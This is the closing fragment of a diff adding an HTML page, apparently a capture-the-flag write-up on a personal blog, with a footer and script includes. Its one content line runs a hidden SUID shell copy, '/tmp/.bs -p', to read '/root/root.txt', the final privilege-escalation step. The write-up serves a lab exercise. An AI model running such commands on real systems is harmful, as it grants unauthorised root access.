+<span class="pc">/tmp/.bs -p -c 'cat /root/root.txt'</span></div>
+  </div>
+
+</div>
+<footer>
+  <span>© 2026 <a href="https://s-markakis.github.io/index.html">S. Markakis</a></span>
+  <span><a href="https://s-markakis.github.io/blog.html">← All posts</a></span>
+</footer>
+
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
